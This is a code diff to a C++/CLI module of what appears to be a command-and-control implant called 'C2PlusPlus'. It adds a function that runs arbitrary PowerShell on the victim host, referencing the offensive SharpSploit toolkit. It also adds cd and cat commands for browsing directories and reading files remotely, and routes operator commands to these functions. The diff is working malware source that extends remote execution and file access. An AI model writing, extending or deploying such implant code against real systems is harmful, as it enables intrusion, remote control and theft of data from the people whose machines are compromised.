@@ -4,6 +4,17 @@
 #include <vector>
 #include <iterator>
 #include <iostream>
+#include <fstream>
+#include <vcclr.h>
+#include <msclr\marshal_cppstd.h>
+#using <mscorlib.dll>
+#using <System.dll>
+#using <System.Management.Automation.dll>
+
+using namespace System;
+using namespace System::Collections::ObjectModel;
+using namespace System::Management::Automation;
+using namespace System::Collections::Generic; 
 
 namespace C2PlusPlus
 {
@@ -33,6 +44,36 @@ namespace C2PlusPlus
 
 
     }
+    std::string Module::RunPowerShell(const std::string& command)
+    {
+        // references:
+        //https://stackoverflow.com/questions/56782470/why-do-i-have-warning-c4199-two-phase-name-lookup-is-not-supported-for-c-cli
+        //https://stackoverflow.com/questions/19634220/c-and-powershell
+        //https://stackoverflow.com/questions/56499270/would-like-to-run-powershell-code-from-inside-a-c-program
+
+        //SharpSploit ideas
+        //https://github.com/cobbr/SharpSploit/blob/4bf3d2aa44d73b674867a1d28cc90a3bd54f100f/SharpSploit/Execution/Shell.cs
+        //PowerShell::Create()->AddScript(gcnew String(command.c_str()))->Invoke();
+        
+        PowerShell^ _ps = PowerShell::Create();
+        _ps->AddScript(gcnew String(command.c_str()));
+        _ps->AddCommand("Out-String"); // To display the script as normal powershell 
+
+        auto results = _ps->Invoke();
+
+        String^ objectStr;
+
+        for (int i = 0; i < results->Count; i++)
+        {
+            objectStr = results[i]->ToString();
+            //Console::WriteLine(objectStr);
+        }
+        
+        msclr::interop::marshal_context context;
+        result = context.marshal_as<std::string>(objectStr);
+
+        return result;
+    }
     std::string Module::GetCurrentUserName()
     {
         std::string username = "";
@@ -53,7 +94,14 @@ namespace C2PlusPlus
         if (GetCurrentDirectoryA(nPwn, acpwd))
             pwd = acpwd;
 
-        return pwd;
+        // Before returning make sure the path ends with "\"
+        std::string pathfinal = "\\";
+
+        if (pwd.rfind(pathfinal) == pwd.length() - pathfinal.length()) {
+            return pwd;
+        }
+        else
+            return pwd + "\\";
     }
 
     std::string Module::ListCurrentDir(std::string path)
@@ -135,19 +183,36 @@ namespace C2PlusPlus
             for (size_t i = 0; i < directories.size(); i++)
             {
                 if (directories[i] != "." && directories[i] != "..")
-                    list += pwd + "\\" + directories[i] + "\n";
+                    list += pwd + directories[i] + "\n";
             }
 
             list += "\n----- Files ----- \n";
 
             for (size_t i = 0; i < files.size(); i++)
             {
-                list += pwd + "\\" + files[i] + "\n";
+                list += pwd + files[i] + "\n";
             }
 
         }
 
         return list;
+    }
+    std::string Module::ChangeDir(const std::string& directory)
+    {
+        if (SetCurrentDirectoryA(directory.c_str()))
+            return "[+] Current Directory: " + PWD();
+        else
+            return "[-] Unable To Change Directory, check directory name & privileges";
+    }
+    std::string Module::Cat(const std::string& file)
+    {
+        std::string buffer;
+        std::ifstream input(file);
+
+        while (std::getline(input, buffer))
+            result += (buffer + '\n');
+
+        return result;
     }
     std::string Module::Random()
     {
@@ -197,6 +262,18 @@ namespace C2PlusPlus
                 result = ListCurrentDir(command);
             else
                 result = ListCurrentDir();
+        }
+        else if (selectedModule == "cd")
+        {
+            result = ChangeDir(command);
+        }
+        else if (selectedModule == "cat")
+        {
+            result = Cat(command);
+        }
+        else if (selectedModule == "powershell")
+        {
+            result = RunPowerShell("& { " + command + " } *>&1"); // & { } *>&1 - Trick to display errors PowerShell
         }
         else
         {
